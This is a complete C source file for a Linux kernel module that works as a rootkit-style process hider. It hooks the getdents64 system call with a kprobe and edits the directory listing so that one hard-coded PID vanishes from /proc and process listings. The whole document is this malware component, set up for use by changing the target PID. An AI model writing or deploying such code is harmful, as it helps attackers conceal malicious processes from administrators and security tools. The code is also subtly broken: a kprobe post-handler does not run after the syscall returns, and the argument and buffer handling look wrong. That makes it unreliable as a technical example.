#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <linux/uaccess.h>
#include <linux/version.h>

#define TARGET_PID "7916"   // change this to the PID you want to hide (as a string)

static struct kprobe kp = {
    .symbol_name = "__x64_sys_getdents64",
};

// Called AFTER the real getdents64 returns, so we can edit its output
static void handler_post(struct kprobe *p, struct pt_regs *regs, unsigned long flags)
{
    struct linux_dirent64 __user *dirent;
    struct linux_dirent64 *kdirent, *current_dir, *previous_dir = NULL;
    long ret;
    unsigned long offset = 0;

    ret = regs_return_value(regs);
    if (ret <= 0)
        return;

    dirent = (struct linux_dirent64 __user *) regs->si; // 2nd arg to getdents64

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return;
    }

    while (offset < ret) {
        current_dir = (void *)kdirent + offset;

        if (strcmp(current_dir->d_name, TARGET_PID) == 0) {
            // Found our target PID entry — remove it by collapsing the list
            if (current_dir == kdirent) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue; // don't advance offset, re-check same position
            } else {
                previous_dir->d_reclen += current_dir->d_reclen;
            }
        } else {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, ret))
        printk(KERN_WARNING "process_hiding: copy_to_user failed\n");

    kfree(kdirent);
    regs->ax = ret; // fix up the return value (number of bytes)

    return;
}

static int __init hide_init(void)
{
    int ret;

    kp.post_handler = handler_post;
    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "process_hiding: register_kprobe failed, error %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "process_hiding: hook installed, hiding PID %s\n", TARGET_PID);
    return 0;
}

static void __exit hide_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "process_hiding: hook removed\n");
}

module_init(hide_init);
module_exit(hide_exit);
MODULE_LICENSE("GPL");